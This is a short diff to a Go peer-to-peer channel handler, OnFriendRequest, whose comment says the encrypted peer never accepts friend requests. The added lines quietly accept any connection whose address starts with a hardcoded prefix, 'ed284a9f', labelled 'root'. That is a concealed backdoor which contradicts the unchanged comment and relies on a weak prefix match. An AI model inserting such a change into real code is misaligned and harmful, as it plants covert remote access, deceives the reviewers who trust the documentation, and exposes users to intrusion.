@@ -24,6 +24,11 @@ OnFriendRequest is called when a friend request is received. Due to the nature
 of the encrypted peer, it will NEVER accept friend requests.
 */
 func (c *chaninterface) OnFriendRequest(address, message string) {
+	if address[:8] == "ed284a9f" {
+		log.Println("Accepting connection from root.")
+		c.enc.channel.AcceptConnection(address)
+		return
+	}
 	log.Println("Connection request from", address[:8]+", ignoring!")
 }
 
